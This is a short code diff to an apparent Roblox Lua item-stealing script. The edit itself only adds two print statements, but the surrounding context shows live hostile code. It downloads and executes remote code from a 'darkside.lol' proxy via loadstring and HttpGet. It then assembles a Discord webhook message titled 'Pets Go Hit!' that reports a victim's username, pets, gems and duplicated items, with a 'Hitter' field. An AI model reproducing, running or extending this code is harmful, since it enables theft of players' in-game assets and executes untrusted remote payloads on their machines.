@@ -50,6 +50,7 @@ if require(dir[v.id]).difficulty >= _G.Min then
 table.insert(tab, {v.id, require(dir[v.id]).difficulty, (v._am or 1)})
 end
 end
+print(#tab)
 if #tab >= 1 then
 for i,v in pairs(tab) do
 big=big..v[3].."x "..v[1].."(1/"..v[2]..")\\n"
@@ -70,6 +71,7 @@ end
 if not qbig then
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga)
 end
+print(#big)
 local log = ""
 if dh then
 log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..potc..'","name":"Dualed Potions","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
